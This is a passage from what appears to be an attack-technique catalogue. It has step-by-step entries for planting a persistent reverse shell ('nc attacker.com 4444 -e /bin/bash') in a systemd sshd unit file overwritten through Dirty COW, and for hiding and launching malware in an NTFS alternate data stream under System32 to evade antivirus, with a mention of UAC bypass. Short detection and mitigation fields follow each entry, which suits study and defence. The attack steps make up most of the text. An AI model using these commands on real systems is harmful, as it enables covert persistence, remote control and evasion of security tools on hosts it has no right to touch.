Attack Steps: Step 1: In modern Linux, systemd manages services using .service unit files located in /etc/systemd/system/ or /lib/systemd/system/. Step 2: These files define what runs on boot or when a service is restarted. Step 3: If a container has access to the host’s /etc/systemd/system/ directory (even read-only), an attacker can overwrite files like sshd.service using Dirty COW. Step 4: Craft a malicious .service file that runs your script or backdoor binary — for example: ExecStart=/bin/bash -c "nc attacker.com 4444 -e /bin/bash". Step 5: Save this modified file as evil_ssh.service. Step 6: Use Dirty COW to replace /etc/systemd/system/sshd.service with your evil_ssh.service: ./cow /etc/systemd/system/sshd.service evil_ssh.service. Step 7: Reload daemon: systemctl daemon-reexec. Step 8: Restart SSH: systemctl restart sshd. Step 9: Your reverse shell or payload will now run every time SSH starts or on reboot. Step 10: Detection involves monitoring unit file diffs, startup logs, or suspicious behavior on service startup. Step 11: Avoid exposing service files to containers, and enforce file integrity monitoring.
Impact: Persistent remote code execution on boot
Detection Method: Alert on systemd unit changes, monitor daemon reloads, verify file integrity with AIDE or Tripwire
Solution: Harden service files, deny container access to /etc/systemd/, use read-only root filesystem
Tags: systemd backdoor, Service Hijack, Dirty COW

Title: ADS Payload in Trusted Directory
Attack Type: Store malware in ADS of C:\Windows\System32:file.exe
Scenario Description: Hide payload in a trusted system directory’s ADS stream so that AV/EDR may ignore it due to main file being legitimate
Attack Steps: Step 1: Choose a trusted folder like C:\Windows\System32 or C:\Program Files. Step 2: Drop your payload into an alternate stream using: type payload.exe > C:\Windows\System32\trusted.dll:hidden.exe. Step 3: The payload doesn’t appear in dir command — verify with dir /r. Step 4: Execute it using: start C:\Windows\System32\trusted.dll:hidden.exe. Step 5: AV/EDR may not scan alternate stream or trust the path. Step 6: Combine with UAC bypass to elevate privileges. Step 7: Detection requires enabling ADS auditing and scanning using streams-aware tools.
Impact: Hidden malware in trusted system path
Detection Method: Monitor for unusual ADS usage, enable logging via Sysmon config
Solution: Disable ADS execution, block scripting from trusted paths

Title: Hijack Script via ADS + Scheduled Task
